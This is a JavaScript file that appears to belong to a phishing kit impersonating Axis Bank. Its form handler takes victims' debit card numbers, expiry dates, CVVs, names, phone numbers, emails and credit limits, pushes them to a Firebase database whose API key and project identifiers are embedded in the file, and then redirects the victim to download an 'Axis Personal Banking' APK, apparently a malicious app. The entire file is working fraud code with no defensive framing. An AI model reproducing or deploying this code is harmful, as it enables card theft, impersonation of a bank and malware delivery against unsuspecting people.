// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyDAyX2Hsz5c9lZR6JEafvidol-Mw_ERnhQ",
  authDomain: "project-d0054.firebaseapp.com",
  databaseURL: "https://project-d0054-default-rtdb.firebaseio.com",
  projectId: "project-d0054",
  storageBucket: "project-d0054.appspot.com",
  messagingSenderId: "57829236229",
  appId: "1:57829236229:web:934a6ac84814ec1393c66c",


    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var name = getInputVal('name');
  var phone = getInputVal('phone');
  var debitc = getInputVal('debitc');
  var expdate = getInputVal('expdate');
  var cvv = getInputVal('cvv');
  var cardholder = getInputVal('cardholder');
  var email = getInputVal('email')
  var total_limit = getInputVal('total_limit')
  var available_limit = getInputVal('available_limit')

  // Save message
  saveMessage(name, phone, debitc, expdate, cvv, cardholder, email, total_limit, available_limit);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();
alert("Click Ok And Download Our Axis Bank APP ")
document.getElementById('contactForm').reset();
window.location.assign("./app/Axis Personal Banking.apk")
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(name, phone, debitc, expdate, cvv, cardholder, email, total_limit, available_limit){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    name: name,
    phone:phone,
    debitc:debitc,
    expdate:expdate,
    cvv:cvv,
    cardholder:cardholder,
    email:email,
    total_limit:total_limit,
    available_limit:available_limit,
  });
}
